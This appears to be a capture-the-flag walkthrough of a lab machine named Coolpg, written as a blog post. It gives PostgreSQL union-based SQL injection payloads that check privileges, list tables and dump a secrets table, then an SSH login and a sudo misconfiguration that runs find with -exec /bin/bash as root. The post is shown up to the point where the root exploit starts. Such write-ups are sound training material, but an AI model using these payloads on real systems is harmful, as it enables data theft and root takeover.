...
image:
   path: /assets/img/Coolpg/coolpg.png
---
...
Before launching exploits, we interected with application to confirm the vulnerability and determine the optimal attack based on data based privilegies.

#### SQL Injection Confirmation

To confirm the SQL Injection vector, we crafted a basic payload to test if the application would reflect our input.
...
Result:
The application displayed the string "test" in the search results

![Desktop View](/assets/img/Coolpg/result.png){: width="972" height="589" }
_Full screen width and center alignment_
...
With the injection confirmed, we checked the database user's privileges to determine the severity of the vector.

Payload:

```sql
' UNION SELECT current_setting('is_superuser') --
```
> The system returned `off`, indicating we are NOT a superuser.we ruled out direct Remote Command Execution (RCE) via the database and focused on Data Exfiltration.

## Explotation 

Based on the analysis, we proceeded with a targeted Union-Based SQL Injection to exfiltrate data.

#### Schema Enumeration

We mapped the database structure to find relevant tables:

```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--
```

- Findings: `users`, `secrets`.

#### Advanced Data Exfiltration

Targeting the secrets table, we used an advanced payload to extract all data in a single query while handling potential NULL values to prevent data loss.

Payload:

```sql
' UNION SELECT string_agg(COALESCE(name, 'N/A') || ':' || COALESCE(value, 'NO_PASS'), ' | ') FROM secrets--
```

Why this payload?

- string_agg(..., ' | '): Concatenates all rows into a single string, bypassing web application limits that might only display the first result.
- COALESCE(..., '...'): Prevents the entire result from becoming NULL if one field is empty, ensuring robust data extraction.

Result:

![Desktop View](/assets/img/Coolpg/access.png){: width="972" height="589" }
_Full screen width and center alignment_

#### Initial Access

```bash
ssh cool@192.168.1.68
```
```markdown
cool@coolpgi:~$ id
...
With user-level access secured, we focused on internal enumeration to escalate privileges to root.

#### Local Enumeration

Checking for sudo privileges using sudo -l revealed a misconfiguration:

```markdown
(root) NOPASSWD: /usr/local/bin/runlogs-find.sh
```

#### Script Analysis

We inspected the content of /usr/local/bin/runlogs-find.sh:

```bash
#!/bin/sh
exec /usr/bin/find /home/cool ... -exec /bin/bash \; -quit
```

> The script uses the find command with the -exec flag.find will execute /bin/bash for the first file it finds. Since the script runs with sudo, the spawned shell will inherit root privileges.


#### Privilege Escalation (Root)

We executed the vulnerable script:
